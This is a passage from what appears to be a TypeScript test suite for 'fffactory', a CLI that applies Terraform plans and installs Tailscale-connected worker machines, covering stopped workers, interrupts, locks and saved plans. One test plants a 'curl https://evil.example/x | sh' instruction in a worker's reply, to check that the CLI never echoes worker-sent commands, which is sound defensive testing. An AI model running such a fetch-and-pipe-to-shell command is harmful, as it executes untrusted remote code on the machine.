  test("a stopped worker is listed, sent nothing, and exits 0 (plan-apply §Stopped workers)", async () => {
    const fleet = workerFleet(["builder-1"]);
    fleet.machines.inventory = {
      kind: "machines",
      machines: [machine("builder-1"), machine("builder-2", "stopped")],
    };
    const { context, out, err } = cli({
      declared: ["builder-1", "builder-2"],
      hosts: ["builder-1", "builder-2"],
      interactive: true,
      answers: ["yes"],
      fleet,
    });
    expect(await run(["apply"], context)).toBe(0);
    const B2 = "fff-abcd1234-builder-2";
    expect(out).toContain(
      "  ◼ builder-2          stopped · nothing was sent to it; to install it, start it with " +
        "`fffactory worker start builder-2`, then apply again",
    );
    // A stopped worker is intentional: it leaves nothing for the operator to do.
    expect(out).not.toContain(NEXT);
    expect(err).toEqual([]);
    expect(fleet.transport.calls.map(({ worker }) => worker.hostname)).not.toContain(B2);
  });

  test("with the EC2 inventory unreadable, a stopped worker offline in the tailnet is skipped as before", async () => {
    const fleet = workerFleet(["builder-1"]);
    fleet.machines.inventory = { kind: "unavailable", reason: "EC2 DescribeInstances failed: x" };
    const { context, out } = cli({
      declared: ["builder-1", "builder-2"],
      hosts: ["builder-1", "builder-2"],
      interactive: true,
      answers: ["yes"],
      fleet,
    });
    expect(await run(["apply"], context)).toBe(2);
    expect(out).toContain(
      "  ↷ builder-2          skipped · No Tailscale device named fff-abcd1234-builder-2 is visible from this machine",
    );
  });

  describe("a skipped worker with dispatch requested exits 2, never failed (#134)", () => {
    const REQUESTING = `${JSON.stringify(requestingDispatch(), null, 2)}\n`;

    test("deferred Paseo maintenance is reported deferred end to end", async () => {
      const stale = installableWorker(appliedRecord(B1), {
        inspection: inspection(
          B1,
          { release: { state: "active", version: "0.2.0", sha256: "c".repeat(64) } },
          "0.2.0",
        ),
      });
      const { context, out, err } = cli({
        hosts: ["builder-1"],
        interactive: true,
        answers: ["yes"],
        document: REQUESTING,
        fleet: workerFleet(["builder-1"], { [B1]: stale }),
        controlPlane: fakeControlPlane("healthy", { kind: "active", count: 1 }).controlPlane,
        workflowQueue: fakeWorkflowQueue().queue,
      });
      expect(await run(["apply"], context)).toBe(2);
      expect(err).toEqual([]);
      // Skipped by the workers stage, deferred by the control plane and skipped by dispatch: one
      // reason, one recovery instruction.
      expect(out.slice(out.indexOf(RESULT))).toEqual([
        RESULT,
        UNCHANGED,
        "  ! builder-1          skipped · Paseo maintenance is deferred while agents may be active",
        "    ! Control plane   deferred · Maintenance (paseo-package, service-definition, " +
          `listen-address, password) was deferred while agents may be active on ${B1}; it stays on its ` +
          "complete current release",
        "    ✔ Repositories    synchronized",
        "    ↷ Dispatch        skipped",
        "  ! Verification       The factory is not ready: 1 of 1 workers need attention",
        expect.stringMatching(RECORD_LINE),
        "",
        NEXT,
        `  builder-1: Close the active agents on ${B1}, then rerun \`fffactory apply\``,
      ]);
      expect(out.some((line) => line.includes("failed") || line.includes("absent"))).toBe(false);
    });

    test("an offline worker is reported skipped by dispatch, with the workers stage's next action", async () => {
      const { context, out, err } = cli({
        hosts: ["builder-1"],
        interactive: true,
        answers: ["yes"],
        document: REQUESTING,
        fleet: workerFleet(["builder-1"], {}, () =>
          peers(peer(B1, { tags: [WORKER_TAG], online: false })),
        ),
        controlPlane: fakeControlPlane("healthy", { kind: "idle" }).controlPlane,
        workflowQueue: fakeWorkflowQueue().queue,
      });
      expect(await run(["apply"], context)).toBe(2);
      expect(err).toEqual([]);
      expect(out.slice(out.indexOf(RESULT))).toEqual([
        RESULT,
        UNCHANGED,
        "  ↷ builder-1          skipped · Offline in the tailnet",
        "    ↷ Repositories    skipped",
        "    ↷ Dispatch        skipped",
        "  ! Verification       The factory is not ready: 1 of 1 workers need attention",
        expect.stringMatching(RECORD_LINE),
        "",
        NEXT,
        "  builder-1: Check that the instance is running and that Tailscale is up on it, then " +
          "rerun `fffactory apply`.",
      ]);
      expect(out.some((line) => line.includes("failed") || line.includes("absent"))).toBe(false);
    });
  });

  test("one apply creates a worker, waits for its first boot, then installs and verifies it", async () => {
    const { context, out, err } = cli({
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {}, (read) =>
        read < 3 ? fleetView() : fleetView("builder-1"),
      ),
    });
    expect(await run(["apply"], context)).toBe(0);
    expect(err).toEqual([]);
    const applying = out.indexOf(rule("Applying"));
    expect(out.slice(applying - 1, applying + 8)).toEqual([
      ...TERRAFORM,
      "  builder-1        waiting for its first boot (up to 15 min): this apply just created its machine",
      ...INSTALLED,
      "",
      RESULT,
      APPLIED,
    ]);
    expect(out).toContain(ENROLLMENT_PENDING);
  });

  test("a new worker that never finishes its first boot exits 1 with its recovery", async () => {
    const { context, out, err } = cli({
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet([]),
    });
    expect(await run(["apply"], context)).toBe(1);
    const missing = `No Tailscale device named ${B1} is visible from this machine`;
    expect(out).toContain(`  builder-1        still waiting after 1 of up to 15 min: ${missing}`);
    expect(out.filter((line) => line.startsWith("  builder-1        still waiting "))).toHaveLength(
      14,
    );
    expect(err).toEqual([
      `  ✖ builder-1          failed · Its first boot did not finish within 15 min (last seen: ${missing})`,
      "",
      NEXT,
      "  builder-1: Read the bootstrap in the instance's EC2 console output, and check that " +
        "tailnet policy lets this device see the factory's tag. If the console output shows " +
        "the bootstrap failed, terminate it uninspected with " +
        "`fffactory worker terminate builder-1 --keep --force`; if it is still running, " +
        "wait for it to finish, then rerun `fffactory apply`.",
    ]);
  });

  test("an apply interrupted while a new worker boots says no install step ran on it", async () => {
    const fleet = workerFleet([]);
    const { context, err, lockStore, signal } = cli({
      interactive: true,
      answers: ["yes"],
      fleet,
    });
    fleet.fleet.afterSleep = () => {
      signal.interrupted = true;
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ! Interrupted: the factory stays locked, with a record of this operation",
      "    Interrupted while waiting for builder-1 to finish its first boot: no install step " +
        "ran on it.",
      ...BREAK_THEN_RERUN,
    ]);
    expect(lockStore.locks.size).toBe(1);
  });

  test("a failed install exits 1, on standard error, and names the step and its log", async () => {
    const failing = appliedRecord(B1, "0.3.0", {
      state: "failed",
      steps: withStep(pendingSteps(), "harness", "failed", "exited with status 1"),
      verification: null,
    });
    const { context, err } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], { [B1]: installableWorker(failing) }),
    });
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "  ✖ builder-1          failed · Step harness failed: exited with status 1; release 0.3.0 is active but unhealthy",
      "",
      NEXT,
      `  builder-1: Read its output with \`tailscale ssh fffactory-admin@${B1} cat /var/log/fffactory/harness.log\` and fix the cause; the steps are idempotent, so rerunning repairs the worker, then rerun \`fffactory apply\`.`,
    ]);
  });

  test("mixed outcomes: each line on its stream, in order, every next action once", async () => {
    const B2 = "fff-abcd1234-builder-2";
    const failing = appliedRecord(B2, "0.3.0", {
      state: "failed",
      steps: withStep(pendingSteps(), "harness", "failed", "exited with status 1"),
      verification: null,
    });
    const { context, written } = cli({
      declared: ["builder-1", "builder-2"],
      hosts: ["builder-1", "builder-2"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1", "builder-2"], { [B2]: installableWorker(failing) }),
    });
    expect(await run(["apply"], context)).toBe(1);
    const result = written.slice(written.findIndex(({ line }) => line === RESULT) - 1);
    const readLog =
      `Read its output with \`tailscale ssh fffactory-admin@${B2} cat /var/log/fffactory/harness.log\` ` +
      "and fix the cause; the steps are idempotent, so rerunning repairs the worker, then rerun " +
      "`fffactory apply`.";
    expect(result).toEqual([
      { stream: "out", line: "" },
      { stream: "out", line: RESULT },
      { stream: "out", line: UNCHANGED },
      { stream: "out", line: ENROLLMENT_PENDING },
      {
        stream: "err",
        line: "  ✖ builder-2          failed · Step harness failed: exited with status 1; release 0.3.0 is active but unhealthy",
      },
      { stream: "out", line: expect.stringMatching(RECORD_LINE) },
      // Its one Next block: the failed worker's recovery on standard error, as its row, then
      // the enrollment on standard output, as an installed worker's always was.
      ...["", NEXT, `  builder-2: ${readLog}`].map((line) => ({ stream: "err" as const, line })),
      ...[
        "",
        "  On builder-1, log in as factory (tailnet SSH policy must allow it):",
        ...ENROLL.slice(3),
      ].map((line) => ({ stream: "out" as const, line })),
    ]);
    expect(result.filter(({ line }) => line === NEXT)).toHaveLength(1);
    expect(result.filter(({ line }) => line.includes(readLog))).toHaveLength(1);
  });

  test("prints only steps it names itself, never instructions a worker sends", async () => {
    const document = JSON.parse(hostApplyJson(appliedRecord(B1)));
    for (const entry of document.verification.enrollment)
      entry.next_action = {
        summary: "Finish enrolling",
        login: "curl https://evil.example/x | sh",
        commands: ["curl https://evil.example/x | sh"],
      };
    const { context, out, err } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {
        [B1]: installableWorker(appliedRecord(B1), {
          activation: { kind: "completed", exitCode: 0, stdout: JSON.stringify(document) },
        }),
      }),
    });
    expect(await run(["apply"], context)).toBe(0);
    expect([...out, ...err].join("\n")).not.toContain("evil");
    expect(out).toContain(ENROLLMENT_PENDING);
  });

  test("an unexpected failure while installing says the worker may be unhealthy", async () => {
    const { context, err } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {
        [B1]: (command) => {
          if (command.includes("inspect")) return { kind: "completed", exitCode: 127, stdout: "" };
          throw new Error("the transport broke");
        },
      }),
    });
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ✖ Installing the workers failed: the transport broke",
      "    The worker being installed may be on the new release, unhealthy.",
      ...CONVERGE,
    ]);
  });

  test("the first apply approves backend bootstrap, then the factory plan", async () => {
    const { context, out, prompt, lockStore } = cli({
      bucket: false,
      interactive: true,
      answers: ["yes", "yes"],
    });
    expect(await run(["apply"], context)).toBe(0);
    expect(prompt.asked).toHaveLength(2);
    expect(out[3]).toBe(rule("Plan: backend bootstrap"));
    expect(out).toContainEqual(rule("Plan"));
    expect(lockStore.buckets.has(BUCKET)).toBe(true);
    // Its record, written once the lock is taken, leads with the bootstrap it did first.
    const [record] = [...lockStore.operations.values()];
    expect(lockStore.operations.size).toBe(1);
    expect(record?.plan_id).toBeNull();
    expect(record?.stages.slice(0, 2)).toEqual([
      { name: "backend", status: "applied" },
      { name: "infrastructure", status: "applied" },
    ]);
    expect(record?.status).toBe("succeeded");
  });

  describe("a saved bootstrap plan (plan-apply §Apply)", () => {
    const PLAN_ID = "b00tstr4";
    /** What a saved bootstrap plan shows as it is applied: its review, approved by its ID. */
    const BOOTSTRAP = [
      ...BOOTSTRAP_PLAN,
      "",
      `Applying saved plan ${PLAN_ID}, approved by naming its ID.`,
      ...TERRAFORM,
    ];

    /**
     * Saves bootstrap plan B for the factory as it is now, its `backend.tfplan` planned in the
     * world, as `fffactory plan` would before the first apply.
     */
    async function saveBootstrapPlan(world: ReturnType<typeof cli>): Promise<void> {
      const files = await world.planStore.create(FACTORY, PLAN_ID);
      await world.terraform.provisioner.plan({
        configuration: { directory: `${ASSETS}/terraform`, root: "backend" },
        credentials: { source: "chain" },
        region: "eu-west-2",
        backend: {},
        planFile: files.backend,
        variables: {},
      });
      await world.planStore.save(
        newSavedBootstrapPlan({
          planId: PLAN_ID,
          factoryId: FACTORY,
          instancePath: PATH,
          configurationSha256: sha256Hex(new TextEncoder().encode(world.store.files[PATH])),
          release: "0.3.0" as Release,
          assetsSha256: FAKE_ASSETS_SHA256,
          accountId: "123456789012",
          now: TEST_NOW,
          changes: [{ address: STATE_BUCKET_ADDRESS, actions: ["create"] }],
        }),
      );
      world.terraform.calls.length = 0;
    }

    test("with no terminal, creates the bucket from exactly B, records B, and names the next step", async () => {
      const world = cli({ bucket: false });
      await saveBootstrapPlan(world);
      const { context, out, err, prompt, lockStore, terraform, planStore } = world;
      expect(await run(["apply", "--plan-id", PLAN_ID], context)).toBe(0);
      expect(err).toEqual([]);
      expect(out).toEqual([
        ...header("apply"),
        ...BOOTSTRAP,
        "",
        RESULT,
        "  State bucket       created",
        expect.stringMatching(
          /^ {2}Operation record {3}s3:\/\/fff-abcd1234-state\/fff-abcd1234-operations\/.+\.json$/,
        ),
        "",
        NEXT,
        "  Plan the factory next:",
        "    $ fffactory plan",
      ]);
      expect(prompt.asked).toEqual([]);
      expect(
        terraform.calls.map(({ call, request }) => `${call} ${request.configuration.root}`),
      ).toEqual(["showPlan backend", "applyPlan backend"]);
      expect(lockStore.buckets.has(BUCKET)).toBe(true);
      expect(lockStore.locks.size).toBe(0);
      const records = [...lockStore.operations.values()];
      expect(records).toHaveLength(1);
      expect(records[0]).toMatchObject({
        plan_id: PLAN_ID,
        status: "succeeded",
        stages: [{ name: "backend", status: "applied" }],
      });
      expect(planStore.saved.size).toBe(0);
      // B is spent: a rerun names it missing.
      out.length = 0;
      expect(await run(["apply", "--plan-id", PLAN_ID], context)).toBe(1);
      expect(err[1]).toStartWith(`✖ There is no saved plan ${PLAN_ID} for this factory here`);
    });

    test("the next step repeats the instance and profile, quoted as plan quotes them", async () => {
      const world = cli({ bucket: false });
      const elsewhere = "/elsewhere/my factory.json";
      world.store.files[elsewhere] = world.store.files[PATH] as string;
      const files = await world.planStore.create(FACTORY, PLAN_ID);
      await world.terraform.provisioner.plan({
        configuration: { directory: `${ASSETS}/terraform`, root: "backend" },
        credentials: { source: "--profile", profile: "factory" },
        region: "eu-west-2",
        backend: {},
        planFile: files.backend,
        variables: {},
      });
      await world.planStore.save(
        newSavedBootstrapPlan({
          planId: PLAN_ID,
          factoryId: FACTORY,
          instancePath: elsewhere,
          configurationSha256: sha256Hex(new TextEncoder().encode(world.store.files[PATH])),
          release: "0.3.0" as Release,
          assetsSha256: FAKE_ASSETS_SHA256,
          accountId: "123456789012",
          now: TEST_NOW,
          changes: [{ address: STATE_BUCKET_ADDRESS, actions: ["create"] }],
        }),
      );
      const args = ["apply", "--plan-id", PLAN_ID, "--instance", elsewhere, "--profile", "factory"];
      expect(await run(args, world.context)).toBe(0);
      expect(world.out.slice(-2)).toEqual([
        "  Plan the factory next:",
        "    $ fffactory plan --instance '/elsewhere/my factory.json' --profile factory",
      ]);
    });

    test("factory.json edited after B is refused as stale, with nothing changed", async () => {
      const world = cli({ bucket: false });
      await saveBootstrapPlan(world);
      const { context, err, store, terraform, lockStore, planStore } = world;
      store.files[PATH] = text(["builder-1", "builder-2"]);
      expect(await run(["apply", "--plan-id", PLAN_ID], context)).toBe(1);
      expect(err).toEqual([
        "",
        `✖ Refusing to apply plan ${PLAN_ID}: it is no longer the plan to apply:`,
        "  factory.json changed after it was planned",
        "",
        "Nothing was applied.",
        "",
        NEXT,
        "  Review a new plan:",
        "    $ fffactory plan",
      ]);
      expect(terraform.calls).toEqual([]);
      expect(lockStore.buckets.size).toBe(0);
      expect(lockStore.calls.some((call) => call.startsWith("create"))).toBe(false);
      expect(lockStore.operations.size).toBe(0);
      expect(planStore.saved.has(`${FACTORY}/${PLAN_ID}`)).toBe(true);
    });

    test("a state bucket created after B makes it stale", async () => {
      const world = cli({ bucket: false });
      await saveBootstrapPlan(world);
      world.lockStore.buckets.add(BUCKET);
      expect(await run(["apply", "--plan-id", PLAN_ID], world.context)).toBe(1);
      expect(world.err).toContain("  the state bucket was created after it was planned");
      expect(world.terraform.calls).toEqual([]);
      expect(world.lockStore.operations.size).toBe(0);
    });

    test("another account is refused before anything is planned or applied", async () => {
      const other = fakeCallerIdentity({
        kind: "caller",
        caller: { ...FAKE_CALLER, account: "210987654321" },
      });
      const world = cli({ bucket: false, identity: other });
      await saveBootstrapPlan(world);
      world.planStore.calls.length = 0;
      expect(await run(["apply", "--plan-id", PLAN_ID], world.context)).toBe(1);
      expect(world.err[0]).toStartWith("Refusing to apply: ");
      expect(world.terraform.calls).toEqual([]);
      expect(world.lockStore.calls).toEqual([]);
      expect(world.planStore.calls).toEqual([]);
      expect(world.assets.materialized).toEqual([]);
      expect(world.lockStore.buckets.size).toBe(0);
    });

    test("a failed Terraform apply is reported as a bootstrap failure, with no record", async () => {
      const world = cli({ bucket: false });
      await saveBootstrapPlan(world);
      world.terraform.world.failNext = "applyPlan";
      expect(await run(["apply", "--plan-id", PLAN_ID], world.context)).toBe(1);
      expect(world.err).toEqual(["fffactory: `terraform apply` exited with status 1"]);
      expect(world.lockStore.operations.size).toBe(0);
      expect(world.lockStore.locks.size).toBe(0);
    });

    test("an interrupt before the lock says the factory is not locked, and names plan next", async () => {
      const world = cli({ bucket: false });
      await saveBootstrapPlan(world);
      world.terraform.world.beforeChange = () => {
        world.signal.interrupted = true;
      };
      const args = ["apply", "--plan-id", PLAN_ID, "--profile", "factory"];
      expect(await run(args, world.context)).toBe(1);
      // Without a terminal `fffactory apply` is refused, and B may be spent: plan again.
      expect(world.err).toEqual([
        "",
        RESULT,
        "  ! Interrupted before the factory was locked: it is not locked",
        `    Saved plan ${PLAN_ID} may be spent and the state bucket created.`,
        "",
        NEXT,
        "  Plan again from what exists now:",
        "    $ fffactory plan --profile factory",
      ]);
      expect(world.lockStore.locks.size).toBe(0);
    });

    test("an interrupt as it takes the lock keeps it, and names plan after the break", async () => {
      const world = cli({ bucket: false });
      await saveBootstrapPlan(world);
      const { lockStore, signal } = world;
      const create = lockStore.create.bind(lockStore);
      lockStore.create = async (bucket, record) => {
        signal.interrupted = true;
        return create(bucket, record);
      };
      expect(await run(["apply", "--plan-id", PLAN_ID], world.context)).toBe(1);
      expect(world.err).toEqual([
        "",
        RESULT,
        "  ! Interrupted: the factory stays locked by this apply, which may have no operation record",
        "",
        NEXT,
        "  Once fffactory has exited, break the lock:",
        "    $ fffactory lock break",
        "  Then plan the factory next:",
        "    $ fffactory plan",
      ]);
      expect(lockStore.buckets.has(BUCKET)).toBe(true);
      expect(lockStore.locks.size).toBe(1);
    });

    test("an interrupt once B's record is written keeps the lock, and prints the record", async () => {
      const world = cli({ bucket: false });
      await saveBootstrapPlan(world);
      const { lockStore, signal } = world;
      const write = lockStore.writeOperation.bind(lockStore);
      lockStore.writeOperation = async (bucket, record) => {
        await write(bucket, record);
        signal.interrupted = true;
      };
      const args = ["apply", "--plan-id", PLAN_ID, "--profile", "factory"];
      expect(await run(args, world.context)).toBe(1);
      expect(world.err).toEqual([
        "",
        RESULT,
        "  ! Interrupted: the factory stays locked, with a record of this operation",
        "",
        NEXT,
        "  Once fffactory has exited, break the lock:",
        "    $ fffactory lock break --profile factory",
        "  Then plan the factory next:",
        "    $ fffactory plan --profile factory",
      ]);
      expect(world.out.at(-1)).toMatch(
        /^ {2}Operation record {3}s3:\/\/fff-abcd1234-state\/fff-abcd1234-operations\/.+\.json$/,
      );
      expect(lockStore.locks.size).toBe(1);
      expect(lockStore.operations.size).toBe(1);
    });
  });

  describe("a fresh factory with no terminal (epic #54)", () => {
    /** Different bytes on every draw, so each plan, lock and record gets its own ID. */
    function countingBytes(): RandomBytes {
      let draws = 0;
      return (count) => new Uint8Array(count).fill(draws++ % 36);
    }

    /** The plan ID the last `fffactory plan` printed the apply command for. */
    function printedPlanId(out: readonly string[]): string {
      const command = out.find((line) => line.startsWith("    $ fffactory apply --plan-id "));
      const planId = command?.split(" ")[8];
      if (planId === undefined) throw new Error(`no apply command in ${out.join("\n")}`);
      return planId;
    }

    test("plan, apply B, plan, apply F: bootstrap then the factory, each record naming its plan", async () => {
      const world = cli({ bucket: false, randomBytes: countingBytes() });
      const { context, out, err, prompt, lockStore, identity, terraform } = world;

      expect(await run(["plan"], context)).toBe(0);
      const bootstrapPlan = printedPlanId(out);
      expect(out).toContain("The factory itself is planned once the state bucket exists.");
      expect(out.at(-1)).toBe("    $ fffactory plan");
      expect(lockStore.buckets.size).toBe(0);

      out.length = 0;
      expect(await run(["apply", "--plan-id", bootstrapPlan], context)).toBe(0);
      expect(out).toContain("  State bucket       created");
      expect(out.slice(-2)).toEqual(["  Plan the factory next:", "    $ fffactory plan"]);
      expect(lockStore.buckets.has(BUCKET)).toBe(true);
      expect(terraform.calls.map(({ call }) => call)).not.toContain("output");

      out.length = 0;
      expect(await run(["plan"], context)).toBe(0);
      const factoryPlan = printedPlanId(out);
      expect(factoryPlan).not.toBe(bootstrapPlan);
      expect(out).toContain(rule("Plan"));

      out.length = 0;
      expect(await run(["apply", "--plan-id", factoryPlan], context)).toBe(0);
      expect(out).toContain(APPLIED);

      expect(err).toEqual([]);
      expect(prompt.asked).toEqual([]);
      // The account check ran first in each of the four commands.
      expect(identity.requests).toHaveLength(4);
      expect(lockStore.locks.size).toBe(0);
      const records = [...lockStore.operations.values()];
      expect(records.map(({ plan_id, status }) => [plan_id, status])).toEqual([
        [bootstrapPlan, "succeeded"],
        [factoryPlan, "succeeded"],
      ]);
      expect(records[0]?.stages).toEqual([{ name: "backend", status: "applied" }]);
      expect(records[1]?.stages[0]).toEqual({ name: "infrastructure", status: "applied" });
      expect(records[1]?.stages.map(({ name }) => name)).not.toContain("backend");
    });

    test("a bootstrap plan applied after factory.json changes is refused, with nothing changed", async () => {
      const { context, out, err, store, lockStore, terraform, planStore } = cli({ bucket: false });
      expect(await run(["plan"], context)).toBe(0);
      const bootstrapPlan = printedPlanId(out);
      store.files[PATH] = text(["builder-1", "builder-2"]);
      terraform.calls.length = 0;
      expect(await run(["apply", "--plan-id", bootstrapPlan], context)).toBe(1);
      expect(err).toEqual([
        "",
        `✖ Refusing to apply plan ${bootstrapPlan}: it is no longer the plan to apply:`,
        "  factory.json changed after it was planned",
        "",
        "Nothing was applied.",
        "",
        NEXT,
        "  Review a new plan:",
        "    $ fffactory plan",
      ]);
      expect(terraform.calls).toEqual([]);
      expect(lockStore.buckets.size).toBe(0);
      expect(lockStore.operations.size).toBe(0);
      expect(planStore.saved.has(`${FACTORY}/${bootstrapPlan}`)).toBe(true);
    });
  });

  test("an apply that found the state bucket records no backend stage", async () => {
    const { context, lockStore } = cli({ interactive: true, answers: ["yes"] });
    expect(await run(["apply"], context)).toBe(0);
    const [record] = [...lockStore.operations.values()];
    expect(record?.stages[0]).toEqual({ name: "infrastructure", status: "applied" });
    expect(record?.stages.map(({ name }) => name)).not.toContain("backend");
  });

  test("an interrupted apply keeps the lock and says how to recover", async () => {
    const { context, out, err, lockStore, terraform, signal } = cli({
      interactive: true,
      answers: ["yes"],
    });
    terraform.world.beforeChange = (applied) => {
      if (applied === 0) return;
      signal.interrupted = true;
      throw new Error("`terraform apply` exited with status 1");
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ! Interrupted: the factory stays locked, with a record of this operation",
      ...BREAK_THEN_RERUN,
    ]);
    expect(out.at(-1)).toMatch(/^ {2}Operation record {3}s3:\/\//);
    expect(lockStore.locks.size).toBe(1);
  });

  test("an apply interrupted while a worker installs says it may still be installing", async () => {
    const holder: { signal?: { interrupted: boolean } } = {};
    const answer = installableWorker(appliedRecord(B1));
    const { context, err, lockStore, signal } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {
        [B1]: (command, stdin) => {
          if (command[0] === "sudo" && holder.signal) holder.signal.interrupted = true;
          return typeof answer === "function" ? answer(command, stdin) : answer;
        },
      }),
    });
    holder.signal = signal;
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ! Interrupted: the factory stays locked, with a record of this operation",
      "    Interrupted while installing on builder-1: host apply may still be running there, " +
        "and a rerun skips that worker until it has finished.",
      ...BREAK_THEN_RERUN,
    ]);
    expect(lockStore.locks.size).toBe(1);
  });

  test("an apply interrupted as it takes the lock says the lock may have no record", async () => {
    const { context, err, lockStore, signal } = cli({ interactive: true, answers: ["yes"] });
    const create = lockStore.create.bind(lockStore);
    lockStore.create = async (bucket, record) => {
      signal.interrupted = true;
      return create(bucket, record);
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ! Interrupted: the factory stays locked by this apply, which may have no operation record",
      ...BREAK_THEN_RERUN,
    ]);
    expect(lockStore.locks.size).toBe(1);
  });

  test("an apply interrupted before it takes the lock says the factory is not locked", async () => {
    const { context, err, lockStore, prompt, signal } = cli({
      bucket: false,
      interactive: true,
      answers: ["yes"],
    });
    const ask = prompt.prompt.ask;
    prompt.prompt.ask = async (question) => {
      signal.interrupted = true;
      return ask(question);
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ! Interrupted before the factory was locked: it is not locked",
      "",
      NEXT,
      "  Rerun: it plans again from what exists now:",
      "    $ fffactory apply",
    ]);
    expect(lockStore.locks.size).toBe(0);
  });

  test("an operation record that cannot be finished is reported after applying", async () => {
    const { context, out, err, lockStore } = cli({ interactive: true, answers: ["yes"] });
    const write = lockStore.writeOperation.bind(lockStore);
    lockStore.writeOperation = async (bucket, record) => {
      if (record.status === "succeeded")
        throw new Error("S3 PutObject on the state bucket failed: SlowDown");
      await write(bucket, record);
    };
    expect(await run(["apply"], context)).toBe(0);
    expect(err).toEqual([
      "",
      "  ✖ The operation record could not be finished: S3 PutObject on the state bucket failed: SlowDown",
    ]);
    // Said before the Next block, which stays on standard output: the apply succeeded.
    expect(out.slice(out.indexOf(RESULT)).slice(-ENROLL.length)).toEqual(ENROLL);
  });

  test("a failed apply whose record cannot be finished reports both", async () => {
    const { context, err, lockStore, terraform } = cli({ interactive: true, answers: ["yes"] });
    terraform.world.failNext = "applyPlan";
    const write = lockStore.writeOperation.bind(lockStore);
    lockStore.writeOperation = async (bucket, record) => {
      if (record.status === "failed")
        throw new Error("S3 PutObject on the state bucket failed: SlowDown");
      await write(bucket, record);
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "",
      RESULT,
      "  ✖ Applying failed: `terraform apply` exited with status 1",
      "    Terraform may have changed some of the infrastructure before it stopped.",
      "",
      "  ✖ The operation record could not be finished: S3 PutObject on the state bucket failed: SlowDown",
      ...CONVERGE,
    ]);
  });

  test("refusals to plan are shown for apply too", async () => {
    const { context, err } = cli({ interactive: true, hosts: ["builder-1", "builder-2"] });
    expect(await run(["apply"], context)).toBe(1);
    expect(err[1]).toStartWith("✖ Refusing: this change needs host removal");
    const other = cli({
      interactive: true,
      document: text(["builder-1"], { release: "0.2.0" }),
    });
    expect(await run(["apply"], other.context)).toBe(1);
    expect(other.err[1]).toStartWith("✖ Refusing to apply: factory.json pins another");
  });

  test("an empty --profile is refused", async () => {
    const { context, err } = cli();
    expect(await run(["apply", "--profile", ""], context)).toBe(1);
    expect(err).toEqual(["fffactory apply: --profile needs a profile name"]);
  });
});

describe("Terraform's diagnostics (plan-apply §Failure)", () => {
  const MARKER = "diagnostic-marker-7f3e";
  const STDERR = `Error: creating EC2 Instance: UnauthorizedOperation\n  with ${MARKER}\n`;
  const SHOWN = JSON.stringify({
    format_version: "1.2",
    resource_changes: [
      { address: hostAddress("builder-1"), type: "aws_instance", change: { actions: ["create"] } },
    ],
  });
  let scratch: string;

  beforeAll(async () => {
    scratch = await realpath(await mkdtemp(join(tmpdir(), "fffactory-diagnostics-")));
  });

  afterAll(async () => {
    await rm(scratch, { recursive: true, force: true });
  });

  /**
   * The CLI over the real Terraform provisioner running the stand-in Terraform, with the
   * release's Terraform tree in a private cache (`XDG_CACHE_HOME`), and the in-memory bucket.
   */
  async function realTerraform(behaviors: Record<string, Behavior>) {
    const home = await mkdtemp(join(scratch, "cache-"));
    const cache = join(home, "fffactory");
    const root = join(cache, "releases", "0.3.0", "terraform", "factory");
    await mkdir(root, { recursive: true });
    await writeFile(join(root, ".terraform.lock.hcl"), "# lockfile\n");
    const terraform = await fakeTerraform(await mkdtemp(join(scratch, "bin-")));
    await terraform.behave(behaviors);
    const lockStore = new MemoryLockStore([BUCKET]);
    const store = new MemoryInstanceStore({ [PATH]: text(["builder-1"]) });
    const prompt = fakePrompt({ interactive: true, answers: ["yes"] });
    const context = harness(
      store,
      { XDG_CACHE_HOME: home },
      {
        lockStore,
        prompt: prompt.prompt,
        planStore: filesystemPlanStore(planStoreDirectory(cache)),
        provisioner: terraformProvisioner({
          cacheDirectory: cache,
          terraform: { install: async () => terraform.executable },
          run: terraformRunner({ PATH: process.env.PATH ?? "" }),
        }),
      },
    );
    const diagnostics = managedTerraformPaths(cache, SUPPORTED_TERRAFORM.version).diagnostics;
    return { ...context, lockStore, diagnostics };
  }

  /** The one diagnostics file a line names, checked to be private and to hold `STDERR`. */
  async function namedFile(line: string | undefined, directory: string) {
    const file = /^(?:Terraform's diagnostics: | {2}Terraform's diagnostics {3})(.+)$/.exec(
      line ?? "",
    )?.[1];
    if (file === undefined) throw new Error(`no diagnostics file named in ${line}`);
    expect(dirname(file)).toBe(directory);
    expect(await readFile(file, "utf8")).toBe(STDERR);
    expect((await stat(file)).mode & 0o777).toBe(0o600);
  }

  test("a failed apply prints only the path of a private file holding Terraform's standard error", async () => {
    const { context, out, err, lockStore, diagnostics } = await realTerraform({
      output: { stdout: "{}" },
      show: { stdout: SHOWN },
      apply: { exitCode: 1, stderr: STDERR },
    });
    expect(await run(["apply"], context)).toBe(1);
    expect(err.slice(0, 5)).toEqual([
      "",
      RESULT,
      "  ✖ Applying failed: `terraform apply` exited with status 1",
      "    Terraform may have changed some of the infrastructure before it stopped.",
      "",
    ]);
    // The diagnostics' path, then the record's, aligned though on two streams.
    await namedFile(err[5], diagnostics);
    expect(err.slice(6)).toEqual(CONVERGE);
    expect(out.at(-1)).toMatch(/^ {2}Operation record {10}s3:\/\//);
    expect([...out, ...err].join("\n")).not.toContain(MARKER);
    const records = JSON.stringify(lockStore.operationWrites);
    expect(records).not.toContain(MARKER);
